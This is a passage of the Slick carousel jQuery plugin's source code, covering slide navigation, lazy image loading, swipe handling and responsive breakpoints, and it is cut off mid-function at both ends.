        for (var s = e.currentSlide, o = s + e.options.slidesToShow; s < o; s++)
          e.options.focusOnChange
            ? e.$slides.eq(s).attr({ tabindex: "0" })
            : e.$slides.eq(s).removeAttr("tabindex");
        e.activateADA();
      }),
      (i.prototype.initArrowEvents = function () {
        var t = this;
        !0 === t.options.arrows &&
          t.slideCount > t.options.slidesToShow &&
          (t.$prevArrow
            .off("click.slick")
            .on("click.slick", { message: "previous" }, t.changeSlide),
          t.$nextArrow
            .off("click.slick")
            .on("click.slick", { message: "next" }, t.changeSlide),
          !0 === t.options.accessibility &&
            (t.$prevArrow.on("keydown.slick", t.keyHandler),
            t.$nextArrow.on("keydown.slick", t.keyHandler)));
      }),
      (i.prototype.initDotEvents = function () {
        var e = this;
        !0 === e.options.dots &&
          e.slideCount > e.options.slidesToShow &&
          (t("li", e.$dots).on(
            "click.slick",
            { message: "index" },
            e.changeSlide
          ),
          !0 === e.options.accessibility &&
            e.$dots.on("keydown.slick", e.keyHandler)),
          !0 === e.options.dots &&
            !0 === e.options.pauseOnDotsHover &&
            e.slideCount > e.options.slidesToShow &&
            t("li", e.$dots)
              .on("mouseenter.slick", t.proxy(e.interrupt, e, !0))
              .on("mouseleave.slick", t.proxy(e.interrupt, e, !1));
      }),
      (i.prototype.initSlideEvents = function () {
        var e = this;
        e.options.pauseOnHover &&
          (e.$list.on("mouseenter.slick", t.proxy(e.interrupt, e, !0)),
          e.$list.on("mouseleave.slick", t.proxy(e.interrupt, e, !1)));
      }),
      (i.prototype.initializeEvents = function () {
        var e = this;
        e.initArrowEvents(),
          e.initDotEvents(),
          e.initSlideEvents(),
          e.$list.on(
            "touchstart.slick mousedown.slick",
            { action: "start" },
            e.swipeHandler
          ),
          e.$list.on(
            "touchmove.slick mousemove.slick",
            { action: "move" },
            e.swipeHandler
          ),
          e.$list.on(
            "touchend.slick mouseup.slick",
            { action: "end" },
            e.swipeHandler
          ),
          e.$list.on(
            "touchcancel.slick mouseleave.slick",
            { action: "end" },
            e.swipeHandler
          ),
          e.$list.on("click.slick", e.clickHandler),
          t(document).on(e.visibilityChange, t.proxy(e.visibility, e)),
          !0 === e.options.accessibility &&
            e.$list.on("keydown.slick", e.keyHandler),
          !0 === e.options.focusOnSelect &&
            t(e.$slideTrack).children().on("click.slick", e.selectHandler),
          t(window).on(
            "orientationchange.slick.slick-" + e.instanceUid,
            t.proxy(e.orientationChange, e)
          ),
          t(window).on(
            "resize.slick.slick-" + e.instanceUid,
            t.proxy(e.resize, e)
          ),
          t("[draggable!=true]", e.$slideTrack).on(
            "dragstart",
            e.preventDefault
          ),
          t(window).on("load.slick.slick-" + e.instanceUid, e.setPosition),
          t(e.setPosition);
      }),
      (i.prototype.initUI = function () {
        var t = this;
        !0 === t.options.arrows &&
          t.slideCount > t.options.slidesToShow &&
          (t.$prevArrow.show(), t.$nextArrow.show()),
          !0 === t.options.dots &&
            t.slideCount > t.options.slidesToShow &&
            t.$dots.show();
      }),
      (i.prototype.keyHandler = function (t) {
        var e = this;
        t.target.tagName.match("TEXTAREA|INPUT|SELECT") ||
          (37 === t.keyCode && !0 === e.options.accessibility
            ? e.changeSlide({
                data: { message: !0 === e.options.rtl ? "next" : "previous" },
              })
            : 39 === t.keyCode &&
              !0 === e.options.accessibility &&
              e.changeSlide({
                data: { message: !0 === e.options.rtl ? "previous" : "next" },
              }));
      }),
      (i.prototype.lazyLoad = function () {
        function e(e) {
          t("img[data-lazy]", e).each(function () {
            var e = t(this),
              i = t(this).attr("data-lazy"),
              n = t(this).attr("data-srcset"),
              s = t(this).attr("data-sizes") || o.$slider.attr("data-sizes"),
              r = document.createElement("img");
            (r.onload = function () {
              e.animate({ opacity: 0 }, 100, function () {
                n && (e.attr("srcset", n), s && e.attr("sizes", s)),
                  e.attr("src", i).animate({ opacity: 1 }, 200, function () {
                    e.removeAttr(
                      "data-lazy data-srcset data-sizes"
                    ).removeClass("slick-loading");
                  }),
                  o.$slider.trigger("lazyLoaded", [o, e, i]);
              });
            }),
              (r.onerror = function () {
                e
                  .removeAttr("data-lazy")
                  .removeClass("slick-loading")
                  .addClass("slick-lazyload-error"),
                  o.$slider.trigger("lazyLoadError", [o, e, i]);
              }),
              (r.src = i);
          });
        }
        var i,
          n,
          s,
          o = this;
        if (
          (!0 === o.options.centerMode
            ? !0 === o.options.infinite
              ? (s =
                  (n = o.currentSlide + (o.options.slidesToShow / 2 + 1)) +
                  o.options.slidesToShow +
                  2)
              : ((n = Math.max(
                  0,
                  o.currentSlide - (o.options.slidesToShow / 2 + 1)
                )),
                (s = o.options.slidesToShow / 2 + 1 + 2 + o.currentSlide))
            : ((n = o.options.infinite
                ? o.options.slidesToShow + o.currentSlide
                : o.currentSlide),
              (s = Math.ceil(n + o.options.slidesToShow)),
              !0 === o.options.fade &&
                (n > 0 && n--, s <= o.slideCount && s++)),
          (i = o.$slider.find(".slick-slide").slice(n, s)),
          "anticipated" === o.options.lazyLoad)
        )
          for (
            var r = n - 1, a = s, l = o.$slider.find(".slick-slide"), c = 0;
            c < o.options.slidesToScroll;
            c++
          )
            r < 0 && (r = o.slideCount - 1),
              (i = (i = i.add(l.eq(r))).add(l.eq(a))),
              r--,
              a++;
        e(i),
          o.slideCount <= o.options.slidesToShow
            ? e(o.$slider.find(".slick-slide"))
            : o.currentSlide >= o.slideCount - o.options.slidesToShow
            ? e(
                o.$slider.find(".slick-cloned").slice(0, o.options.slidesToShow)
              )
            : 0 === o.currentSlide &&
              e(
                o.$slider
                  .find(".slick-cloned")
                  .slice(-1 * o.options.slidesToShow)
              );
      }),
      (i.prototype.loadSlider = function () {
        var t = this;
        t.setPosition(),
          t.$slideTrack.css({ opacity: 1 }),
          t.$slider.removeClass("slick-loading"),
          t.initUI(),
          "progressive" === t.options.lazyLoad && t.progressiveLazyLoad();
      }),
      (i.prototype.next = i.prototype.slickNext =
        function () {
          this.changeSlide({ data: { message: "next" } });
        }),
      (i.prototype.orientationChange = function () {
        this.checkResponsive(), this.setPosition();
      }),
      (i.prototype.pause = i.prototype.slickPause =
        function () {
          this.autoPlayClear(), (this.paused = !0);
        }),
      (i.prototype.play = i.prototype.slickPlay =
        function () {
          var t = this;
          t.autoPlay(),
            (t.options.autoplay = !0),
            (t.paused = !1),
            (t.focussed = !1),
            (t.interrupted = !1);
        }),
      (i.prototype.postSlide = function (e) {
        var i = this;
        !i.unslicked &&
          (i.$slider.trigger("afterChange", [i, e]),
          (i.animating = !1),
          i.slideCount > i.options.slidesToShow && i.setPosition(),
          (i.swipeLeft = null),
          i.options.autoplay && i.autoPlay(),
          !0 === i.options.accessibility &&
            (i.initADA(), i.options.focusOnChange)) &&
          t(i.$slides.get(i.currentSlide)).attr("tabindex", 0).focus();
      }),
      (i.prototype.prev = i.prototype.slickPrev =
        function () {
          this.changeSlide({ data: { message: "previous" } });
        }),
      (i.prototype.preventDefault = function (t) {
        t.preventDefault();
      }),
      (i.prototype.progressiveLazyLoad = function (e) {
        e = e || 1;
        var i,
          n,
          s,
          o,
          r,
          a = this,
          l = t("img[data-lazy]", a.$slider);
        l.length
          ? ((i = l.first()),
            (n = i.attr("data-lazy")),
            (s = i.attr("data-srcset")),
            (o = i.attr("data-sizes") || a.$slider.attr("data-sizes")),
            ((r = document.createElement("img")).onload = function () {
              s && (i.attr("srcset", s), o && i.attr("sizes", o)),
                i
                  .attr("src", n)
                  .removeAttr("data-lazy data-srcset data-sizes")
                  .removeClass("slick-loading"),
                !0 === a.options.adaptiveHeight && a.setPosition(),
                a.$slider.trigger("lazyLoaded", [a, i, n]),
                a.progressiveLazyLoad();
            }),
            (r.onerror = function () {
              e < 3
                ? setTimeout(function () {
                    a.progressiveLazyLoad(e + 1);
                  }, 500)
                : (i
                    .removeAttr("data-lazy")
                    .removeClass("slick-loading")
                    .addClass("slick-lazyload-error"),
                  a.$slider.trigger("lazyLoadError", [a, i, n]),
                  a.progressiveLazyLoad());
            }),
            (r.src = n))
          : a.$slider.trigger("allImagesLoaded", [a]);
      }),
      (i.prototype.refresh = function (e) {
        var i,
          n,
          s = this;
        (n = s.slideCount - s.options.slidesToShow),
          !s.options.infinite && s.currentSlide > n && (s.currentSlide = n),
          s.slideCount <= s.options.slidesToShow && (s.currentSlide = 0),
          (i = s.currentSlide),
          s.destroy(!0),
          t.extend(s, s.initials, { currentSlide: i }),
          s.init(),
          e || s.changeSlide({ data: { message: "index", index: i } }, !1);
      }),
      (i.prototype.registerBreakpoints = function () {
        var e,
          i,
          n,
          s = this,
          o = s.options.responsive || null;
        if ("array" === t.type(o) && o.length) {
          for (e in ((s.respondTo = s.options.respondTo || "window"), o))
            if (((n = s.breakpoints.length - 1), o.hasOwnProperty(e))) {
              for (i = o[e].breakpoint; n >= 0; )
                s.breakpoints[n] &&
                  s.breakpoints[n] === i &&
                  s.breakpoints.splice(n, 1),
                  n--;
              s.breakpoints.push(i), (s.breakpointSettings[i] = o[e].settings);
            }
          s.breakpoints.sort(function (t, e) {
            return s.options.mobileFirst ? t - e : e - t;
          });
        }
      }),
      (i.prototype.reinit = function () {
        var e = this;
        (e.$slides = e.$slideTrack
          .children(e.options.slide)
          .addClass("slick-slide")),
          (e.slideCount = e.$slides.length),
          e.currentSlide >= e.slideCount &&
            0 !== e.currentSlide &&
            (e.currentSlide = e.currentSlide - e.options.slidesToScroll),
          e.slideCount <= e.options.slidesToShow && (e.currentSlide = 0),
          e.registerBreakpoints(),
          e.setProps(),
          e.setupInfinite(),
          e.buildArrows(),
          e.updateArrows(),
          e.initArrowEvents(),
          e.buildDots(),
          e.updateDots(),
          e.initDotEvents(),
          e.cleanUpSlideEvents(),
          e.initSlideEvents(),
          e.checkResponsive(!1, !0),
          !0 === e.options.focusOnSelect &&
            t(e.$slideTrack).children().on("click.slick", e.selectHandler),
          e.setSlideClasses(
            "number" == typeof e.currentSlide ? e.currentSlide : 0
          ),
          e.setPosition(),
          e.focusHandler(),
          (e.paused = !e.options.autoplay),
          e.autoPlay(),
          e.$slider.trigger("reInit", [e]);
      }),
      (i.prototype.resize = function () {
        var e = this;
        t(window).width() !== e.windowWidth &&
          (clearTimeout(e.windowDelay),
          (e.windowDelay = window.setTimeout(function () {
            (e.windowWidth = t(window).width()),
              e.checkResponsive(),
              e.unslicked || e.setPosition();
          }, 50)));
      }),
      (i.prototype.removeSlide = i.prototype.slickRemove =
        function (t, e, i) {
          var n = this;
          return (
            "boolean" == typeof t
              ? (t = !0 === (e = t) ? 0 : n.slideCount - 1)
              : (t = !0 === e ? --t : t),
            !(n.slideCount < 1 || t < 0 || t > n.slideCount - 1) &&
              (n.unload(),
              !0 === i
                ? n.$slideTrack.children().remove()
                : n.$slideTrack.children(this.options.slide).eq(t).remove(),
              (n.$slides = n.$slideTrack.children(this.options.slide)),
              n.$slideTrack.children(this.options.slide).detach(),
              n.$slideTrack.append(n.$slides),
              (n.$slidesCache = n.$slides),
              void n.reinit())
          );
        }),
      (i.prototype.setCSS = function (t) {
        var e,
          i,
          n = this,
          s = {};
        !0 === n.options.rtl && (t = -t),
          (e = "left" == n.positionProp ? Math.ceil(t) + "px" : "0px"),
          (i = "top" == n.positionProp ? Math.ceil(t) + "px" : "0px"),
          (s[n.positionProp] = t),
          !1 === n.transformsEnabled
            ? n.$slideTrack.css(s)
            : ((s = {}),
              !1 === n.cssTransitions
                ? ((s[n.animType] = "translate(" + e + ", " + i + ")"),
                  n.$slideTrack.css(s))
                : ((s[n.animType] = "translate3d(" + e + ", " + i + ", 0px)"),
                  n.$slideTrack.css(s)));
      }),
      (i.prototype.setDimensions = function () {
        var t = this;
        !1 === t.options.vertical
          ? !0 === t.options.centerMode &&
            t.$list.css({ padding: "0px " + t.options.centerPadding })
          : (t.$list.height(
              t.$slides.first().outerHeight(!0) * t.options.slidesToShow
            ),
            !0 === t.options.centerMode &&
              t.$list.css({ padding: t.options.centerPadding + " 0px" })),
          (t.listWidth = t.$list.width()),
          (t.listHeight = t.$list.height()),
          !1 === t.options.vertical && !1 === t.options.variableWidth
            ? ((t.slideWidth = Math.ceil(t.listWidth / t.options.slidesToShow)),
              t.$slideTrack.width(
                Math.ceil(
                  t.slideWidth * t.$slideTrack.children(".slick-slide").length
                )
              ))
            : !0 === t.options.variableWidth
            ? t.$slideTrack.width(5e3 * t.slideCount)
            : ((t.slideWidth = Math.ceil(t.listWidth)),
              t.$slideTrack.height(
                Math.ceil(
                  t.$slides.first().outerHeight(!0) *
                    t.$slideTrack.children(".slick-slide").length
                )
              ));
        var e = t.$slides.first().outerWidth(!0) - t.$slides.first().width();
        !1 === t.options.variableWidth &&
          t.$slideTrack.children(".slick-slide").width(t.slideWidth - e);
      }),
      (i.prototype.setFade = function () {
        var e,
          i = this;
        i.$slides.each(function (n, s) {
          (e = i.slideWidth * n * -1),
            !0 === i.options.rtl
              ? t(s).css({
                  position: "relative",
                  right: e,
                  top: 0,
                  zIndex: i.options.zIndex - 2,
                  opacity: 0,
                })
              : t(s).css({
                  position: "relative",
                  left: e,
                  top: 0,
                  zIndex: i.options.zIndex - 2,
                  opacity: 0,
                });
        }),
          i.$slides
            .eq(i.currentSlide)
            .css({ zIndex: i.options.zIndex - 1, opacity: 1 });
      }),
      (i.prototype.setHeight = function () {
        var t = this;
        if (
          1 === t.options.slidesToShow &&
          !0 === t.options.adaptiveHeight &&
          !1 === t.options.vertical
        ) {
          var e = t.$slides.eq(t.currentSlide).outerHeight(!0);
          t.$list.css("height", e);
        }
      }),
      (i.prototype.setOption = i.prototype.slickSetOption =
        function () {
          var e,
            i,
            n,
            s,
            o,
            r = this,
            a = !1;
          if (
            ("object" === t.type(arguments[0])
              ? ((n = arguments[0]), (a = arguments[1]), (o = "multiple"))
              : "string" === t.type(arguments[0]) &&
                ((n = arguments[0]),
                (s = arguments[1]),
                (a = arguments[2]),
                "responsive" === arguments[0] &&
                "array" === t.type(arguments[1])
                  ? (o = "responsive")
                  : void 0 !== arguments[1] && (o = "single")),
            "single" === o)
          )
            r.options[n] = s;
          else if ("multiple" === o)
            t.each(n, function (t, e) {
              r.options[t] = e;
            });
          else if ("responsive" === o)
            for (i in s)
              if ("array" !== t.type(r.options.responsive))
                r.options.responsive = [s[i]];
              else {
                for (e = r.options.responsive.length - 1; e >= 0; )
                  r.options.responsive[e].breakpoint === s[i].breakpoint &&
                    r.options.responsive.splice(e, 1),
                    e--;
                r.options.responsive.push(s[i]);
              }
          a && (r.unload(), r.reinit());
        }),
      (i.prototype.setPosition = function () {
        var t = this;
        t.setDimensions(),
          t.setHeight(),
          !1 === t.options.fade
            ? t.setCSS(t.getLeft(t.currentSlide))
            : t.setFade(),
          t.$slider.trigger("setPosition", [t]);
      }),
      (i.prototype.setProps = function () {
        var t = this,
          e = document.body.style;
        (t.positionProp = !0 === t.options.vertical ? "top" : "left"),
          "top" === t.positionProp
            ? t.$slider.addClass("slick-vertical")
            : t.$slider.removeClass("slick-vertical"),
          (void 0 === e.WebkitTransition &&
            void 0 === e.MozTransition &&
            void 0 === e.msTransition) ||
            (!0 === t.options.useCSS && (t.cssTransitions = !0)),
          t.options.fade &&
            ("number" == typeof t.options.zIndex
              ? t.options.zIndex < 3 && (t.options.zIndex = 3)
              : (t.options.zIndex = t.defaults.zIndex)),
          void 0 !== e.OTransform &&
            ((t.animType = "OTransform"),
            (t.transformType = "-o-transform"),
            (t.transitionType = "OTransition"),
            void 0 === e.perspectiveProperty &&
              void 0 === e.webkitPerspective &&
              (t.animType = !1)),
          void 0 !== e.MozTransform &&
            ((t.animType = "MozTransform"),
            (t.transformType = "-moz-transform"),
            (t.transitionType = "MozTransition"),
            void 0 === e.perspectiveProperty &&
              void 0 === e.MozPerspective &&
              (t.animType = !1)),
          void 0 !== e.webkitTransform &&
            ((t.animType = "webkitTransform"),
            (t.transformType = "-webkit-transform"),
            (t.transitionType = "webkitTransition"),
            void 0 === e.perspectiveProperty &&
              void 0 === e.webkitPerspective &&
              (t.animType = !1)),
          void 0 !== e.msTransform &&
            ((t.animType = "msTransform"),
            (t.transformType = "-ms-transform"),
            (t.transitionType = "msTransition"),
            void 0 === e.msTransform && (t.animType = !1)),
          void 0 !== e.transform &&
            !1 !== t.animType &&
            ((t.animType = "transform"),
            (t.transformType = "transform"),
            (t.transitionType = "transition")),
          (t.transformsEnabled =
            t.options.useTransform && null !== t.animType && !1 !== t.animType);
      }),
      (i.prototype.setSlideClasses = function (t) {
        var e,
          i,
          n,
          s,
          o = this;
        if (
          ((i = o.$slider
            .find(".slick-slide")
            .removeClass("slick-active slick-center slick-current")
            .attr("aria-hidden", "true")),
          o.$slides.eq(t).addClass("slick-current"),
          !0 === o.options.centerMode)
        ) {
          var r = o.options.slidesToShow % 2 == 0 ? 1 : 0;
          (e = Math.floor(o.options.slidesToShow / 2)),
            !0 === o.options.infinite &&
              (t >= e && t <= o.slideCount - 1 - e
                ? o.$slides
                    .slice(t - e + r, t + e + 1)
                    .addClass("slick-active")
                    .attr("aria-hidden", "false")
                : ((n = o.options.slidesToShow + t),
                  i
                    .slice(n - e + 1 + r, n + e + 2)
                    .addClass("slick-active")
                    .attr("aria-hidden", "false")),
              0 === t
                ? i
                    .eq(i.length - 1 - o.options.slidesToShow)
                    .addClass("slick-center")
                : t === o.slideCount - 1 &&
                  i.eq(o.options.slidesToShow).addClass("slick-center")),
            o.$slides.eq(t).addClass("slick-center");
        } else
          t >= 0 && t <= o.slideCount - o.options.slidesToShow
            ? o.$slides
                .slice(t, t + o.options.slidesToShow)
                .addClass("slick-active")
                .attr("aria-hidden", "false")
            : i.length <= o.options.slidesToShow
            ? i.addClass("slick-active").attr("aria-hidden", "false")
            : ((s = o.slideCount % o.options.slidesToShow),
              (n = !0 === o.options.infinite ? o.options.slidesToShow + t : t),
              o.options.slidesToShow == o.options.slidesToScroll &&
              o.slideCount - t < o.options.slidesToShow
                ? i
                    .slice(n - (o.options.slidesToShow - s), n + s)
                    .addClass("slick-active")
                    .attr("aria-hidden", "false")
                : i
                    .slice(n, n + o.options.slidesToShow)
                    .addClass("slick-active")
                    .attr("aria-hidden", "false"));
        ("ondemand" !== o.options.lazyLoad &&
          "anticipated" !== o.options.lazyLoad) ||
          o.lazyLoad();
      }),
      (i.prototype.setupInfinite = function () {
        var e,
          i,
          n,
          s = this;
        if (
          (!0 === s.options.fade && (s.options.centerMode = !1),
          !0 === s.options.infinite &&
            !1 === s.options.fade &&
            ((i = null), s.slideCount > s.options.slidesToShow))
        ) {
          for (
            n =
              !0 === s.options.centerMode
                ? s.options.slidesToShow + 1
                : s.options.slidesToShow,
              e = s.slideCount;
            e > s.slideCount - n;
            e -= 1
          )
            (i = e - 1),
              t(s.$slides[i])
                .clone(!0)
                .attr("id", "")
                .attr("data-slick-index", i - s.slideCount)
                .prependTo(s.$slideTrack)
                .addClass("slick-cloned");
          for (e = 0; e < n + s.slideCount; e += 1)
            (i = e),
              t(s.$slides[i])
                .clone(!0)
                .attr("id", "")
                .attr("data-slick-index", i + s.slideCount)
                .appendTo(s.$slideTrack)
                .addClass("slick-cloned");
          s.$slideTrack
            .find(".slick-cloned")
            .find("[id]")
            .each(function () {
              t(this).attr("id", "");
            });
        }
      }),
      (i.prototype.interrupt = function (t) {
        t || this.autoPlay(), (this.interrupted = t);
      }),
      (i.prototype.selectHandler = function (e) {
        var i = this,
          n = t(e.target).is(".slick-slide")
            ? t(e.target)
            : t(e.target).parents(".slick-slide"),
          s = parseInt(n.attr("data-slick-index"));
        return (
          s || (s = 0),
          i.slideCount <= i.options.slidesToShow
            ? void i.slideHandler(s, !1, !0)
            : void i.slideHandler(s)
        );
      }),
      (i.prototype.slideHandler = function (t, e, i) {
        var n,
          s,
          o,
          r,
          a,
          l = null,
          c = this;
        if (
          ((e = e || !1),
          !(
            (!0 === c.animating && !0 === c.options.waitForAnimate) ||
            (!0 === c.options.fade && c.currentSlide === t)
          ))
        )
          return (
            !1 === e && c.asNavFor(t),
            (n = t),
            (l = c.getLeft(n)),
            (r = c.getLeft(c.currentSlide)),
            (c.currentLeft = null === c.swipeLeft ? r : c.swipeLeft),
            (!1 === c.options.infinite &&
              !1 === c.options.centerMode &&
              (t < 0 || t > c.getDotCount() * c.options.slidesToScroll)) ||
            (!1 === c.options.infinite &&
              !0 === c.options.centerMode &&
              (t < 0 || t > c.slideCount - c.options.slidesToScroll))
              ? void (
                  !1 === c.options.fade &&
                  ((n = c.currentSlide),
                  !0 !== i && c.slideCount > c.options.slidesToShow
                    ? c.animateSlide(r, function () {
                        c.postSlide(n);
                      })
                    : c.postSlide(n))
                )
              : (c.options.autoplay && clearInterval(c.autoPlayTimer),
                (s =
                  n < 0
                    ? c.slideCount % c.options.slidesToScroll != 0
                      ? c.slideCount - (c.slideCount % c.options.slidesToScroll)
                      : c.slideCount + n
                    : n >= c.slideCount
                    ? c.slideCount % c.options.slidesToScroll != 0
                      ? 0
                      : n - c.slideCount
                    : n),
                (c.animating = !0),
                c.$slider.trigger("beforeChange", [c, c.currentSlide, s]),
                (o = c.currentSlide),
                (c.currentSlide = s),
                c.setSlideClasses(c.currentSlide),
                c.options.asNavFor &&
                  (a = (a = c.getNavTarget()).slick("getSlick")).slideCount <=
                    a.options.slidesToShow &&
                  a.setSlideClasses(c.currentSlide),
                c.updateDots(),
                c.updateArrows(),
                !0 === c.options.fade
                  ? (!0 !== i
                      ? (c.fadeSlideOut(o),
                        c.fadeSlide(s, function () {
                          c.postSlide(s);
                        }))
                      : c.postSlide(s),
                    void c.animateHeight())
                  : void (!0 !== i && c.slideCount > c.options.slidesToShow
                      ? c.animateSlide(l, function () {
                          c.postSlide(s);
                        })
                      : c.postSlide(s)))
          );
      }),
      (i.prototype.startLoad = function () {
        var t = this;
        !0 === t.options.arrows &&
          t.slideCount > t.options.slidesToShow &&
          (t.$prevArrow.hide(), t.$nextArrow.hide()),
          !0 === t.options.dots &&
            t.slideCount > t.options.slidesToShow &&
            t.$dots.hide(),
          t.$slider.addClass("slick-loading");
      }),
      (i.prototype.swipeDirection = function () {
        var t,
          e,
          i,
          n,
          s = this;
        return (
          (t = s.touchObject.startX - s.touchObject.curX),
          (e = s.touchObject.startY - s.touchObject.curY),
          (i = Math.atan2(e, t)),
          (n = Math.round((180 * i) / Math.PI)) < 0 && (n = 360 - Math.abs(n)),
          (n <= 45 && n >= 0) || (n <= 360 && n >= 315)
            ? !1 === s.options.rtl
              ? "left"
              : "right"
            : n >= 135 && n <= 225
            ? !1 === s.options.rtl
              ? "right"
              : "left"
            : !0 === s.options.verticalSwiping
            ? n >= 35 && n <= 135
              ? "down"
              : "up"
            : "vertical"
        );
      }),
      (i.prototype.swipeEnd = function (t) {
        var e,
          i,
          n = this;
        if (((n.dragging = !1), (n.swiping = !1), n.scrolling))
          return (n.scrolling = !1), !1;
        if (
          ((n.interrupted = !1),
          (n.shouldClick = !(n.touchObject.swipeLength > 10)),
          void 0 === n.touchObject.curX)
        )
          return !1;
        if (
          (!0 === n.touchObject.edgeHit &&
            n.$slider.trigger("edge", [n, n.swipeDirection()]),
          n.touchObject.swipeLength >= n.touchObject.minSwipe)
        ) {
          switch ((i = n.swipeDirection())) {
            case "left":
            case "down":
              (e = n.options.swipeToSlide
                ? n.checkNavigable(n.currentSlide + n.getSlideCount())
                : n.currentSlide + n.getSlideCount()),
                (n.currentDirection = 0);
              break;
            case "right":
            case "up":
              (e = n.options.swipeToSlide
                ? n.checkNavigable(n.currentSlide - n.getSlideCount())
                : n.currentSlide - n.getSlideCount()),
                (n.currentDirection = 1);
          }
          "vertical" != i &&
            (n.slideHandler(e),
            (n.touchObject = {}),
            n.$slider.trigger("swipe", [n, i]));
        } else
          n.touchObject.startX !== n.touchObject.curX &&
            (n.slideHandler(n.currentSlide), (n.touchObject = {}));
      }),
      (i.prototype.swipeHandler = function (t) {
        var e = this;
        if (
          !(
            !1 === e.options.swipe ||
            ("ontouchend" in document && !1 === e.options.swipe) ||
            (!1 === e.options.draggable && -1 !== t.type.indexOf("mouse"))
          )
        )
          switch (
            ((e.touchObject.fingerCount =
              t.originalEvent && void 0 !== t.originalEvent.touches
                ? t.originalEvent.touches.length
                : 1),
            (e.touchObject.minSwipe = e.listWidth / e.options.touchThreshold),
            !0 === e.options.verticalSwiping &&
              (e.touchObject.minSwipe =
                e.listHeight / e.options.touchThreshold),
            t.data.action)
          ) {
            case "start":
              e.swipeStart(t);
              break;
            case "move":
              e.swipeMove(t);
              break;
            case "end":
              e.swipeEnd(t);
          }
      }),
      (i.prototype.swipeMove = function (t) {
        var e,
          i,
          n,
          s,
          o,
          r,
          a = this;
        return (
          (o = void 0 !== t.originalEvent ? t.originalEvent.touches : null),
          !(!a.dragging || a.scrolling || (o && 1 !== o.length)) &&
            ((e = a.getLeft(a.currentSlide)),
            (a.touchObject.curX = void 0 !== o ? o[0].pageX : t.clientX),
            (a.touchObject.curY = void 0 !== o ? o[0].pageY : t.clientY),
            (a.touchObject.swipeLength = Math.round(
              Math.sqrt(Math.pow(a.touchObject.curX - a.touchObject.startX, 2))
            )),
            (r = Math.round(
              Math.sqrt(Math.pow(a.touchObject.curY - a.touchObject.startY, 2))
            )),
            !a.options.verticalSwiping && !a.swiping && r > 4
              ? ((a.scrolling = !0), !1)
              : (!0 === a.options.verticalSwiping &&
                  (a.touchObject.swipeLength = r),
                (i = a.swipeDirection()),
                void 0 !== t.originalEvent &&
                  a.touchObject.swipeLength > 4 &&
                  ((a.swiping = !0), t.preventDefault()),
                (s =
                  (!1 === a.options.rtl ? 1 : -1) *
                  (a.touchObject.curX > a.touchObject.startX ? 1 : -1)),
                !0 === a.options.verticalSwiping &&
                  (s = a.touchObject.curY > a.touchObject.startY ? 1 : -1),
                (n = a.touchObject.swipeLength),
                (a.touchObject.edgeHit = !1),
                !1 === a.options.infinite &&
                  ((0 === a.currentSlide && "right" === i) ||
                    (a.currentSlide >= a.getDotCount() && "left" === i)) &&
                  ((n = a.touchObject.swipeLength * a.options.edgeFriction),
                  (a.touchObject.edgeHit = !0)),
                !1 === a.options.vertical
                  ? (a.swipeLeft = e + n * s)
                  : (a.swipeLeft =
                      e + n * (a.$list.height() / a.listWidth) * s),
                !0 === a.options.verticalSwiping && (a.swipeLeft = e + n * s),
                !0 !== a.options.fade &&
                  !1 !== a.options.touchMove &&
                  (!0 === a.animating
                    ? ((a.swipeLeft = null), !1)
                    : void a.setCSS(a.swipeLeft))))
        );
      }),
      (i.prototype.swipeStart = function (t) {
        var e,
          i = this;
        return (
          (i.interrupted = !0),
          1 !== i.touchObject.fingerCount ||
          i.slideCount <= i.options.slidesToShow
            ? ((i.touchObject = {}), !1)
            : (void 0 !== t.originalEvent &&
                void 0 !== t.originalEvent.touches &&
                (e = t.originalEvent.touches[0]),
              (i.touchObject.startX = i.touchObject.curX =
                void 0 !== e ? e.pageX : t.clientX),
              (i.touchObject.startY = i.touchObject.curY =
                void 0 !== e ? e.pageY : t.clientY),
              void (i.dragging = !0))
        );
      }),
      (i.prototype.unfilterSlides = i.prototype.slickUnfilter =
        function () {
          var t = this;
          null !== t.$slidesCache &&
            (t.unload(),
            t.$slideTrack.children(this.options.slide).detach(),
            t.$slidesCache.appendTo(t.$slideTrack),
            t.reinit());
        }),
      (i.prototype.unload = function () {
        var e = this;
        t(".slick-cloned", e.$slider).remove(),
          e.$dots && e.$dots.remove(),
          e.$prevArrow &&
            e.htmlExpr.test(e.options.prevArrow) &&
            e.$prevArrow.remove(),
          e.$nextArrow &&
            e.htmlExpr.test(e.options.nextArrow) &&
            e.$nextArrow.remove(),
          e.$slides
            .removeClass("slick-slide slick-active slick-visible slick-current")
            .attr("aria-hidden", "true")
            .css("width", "");
      }),
      (i.prototype.unslick = function (t) {
        var e = this;
        e.$slider.trigger("unslick", [e, t]), e.destroy();
      }),
      (i.prototype.updateArrows = function () {
        var t = this;
        Math.floor(t.options.slidesToShow / 2),
          !0 === t.options.arrows &&
            t.slideCount > t.options.slidesToShow &&
            !t.options.infinite &&
            (t.$prevArrow
              .removeClass("slick-disabled")
              .attr("aria-disabled", "false"),
            t.$nextArrow
              .removeClass("slick-disabled")
              .attr("aria-disabled", "false"),
            0 === t.currentSlide
              ? (t.$prevArrow
                  .addClass("slick-disabled")
                  .attr("aria-disabled", "true"),
                t.$nextArrow
                  .removeClass("slick-disabled")
                  .attr("aria-disabled", "false"))
              : ((t.currentSlide >= t.slideCount - t.options.slidesToShow &&
                  !1 === t.options.centerMode) ||
                  (t.currentSlide >= t.slideCount - 1 &&
                    !0 === t.options.centerMode)) &&
                (t.$nextArrow
                  .addClass("slick-disabled")
                  .attr("aria-disabled", "true"),
                t.$prevArrow
                  .removeClass("slick-disabled")
                  .attr("aria-disabled", "false")));
      }),
      (i.prototype.updateDots = function () {
        var t = this;
        null !== t.$dots &&
          (t.$dots.find("li").removeClass("slick-active").end(),
          t.$dots
            .find("li")
            .eq(Math.floor(t.currentSlide / t.options.slidesToScroll))
            .addClass("slick-active"));
      }),
      (i.prototype.visibility = function () {
        var t = this;
        t.options.autoplay &&
          (document[t.hidden] ? (t.interrupted = !0) : (t.interrupted = !1));
      }),
      (t.fn.slick = function () {
        var t,
          e,
          n = this,
          s = arguments[0],
          o = Array.prototype.slice.call(arguments, 1),
          r = n.length;
        for (t = 0; t < r; t++)
          if (
            ("object" == typeof s || void 0 === s
              ? (n[t].slick = new i(n[t], s))
              : (e = n[t].slick[s].apply(n[t].slick, o)),
            void 0 !== e)
          )
            return e;
        return n;
      });
  }),
  (function (t) {
    t.fn.slickAnimation = function () {
      function e(t, e, i, n, s) {
        (s = void 0 !== s && s),
          1 == e.opacity
            ? (t.addClass(i), t.addClass(n))
            : (t.removeClass(i), t.removeClass(n)),
          s && t.css(e);
      }
      function i(t, e) {
        return t
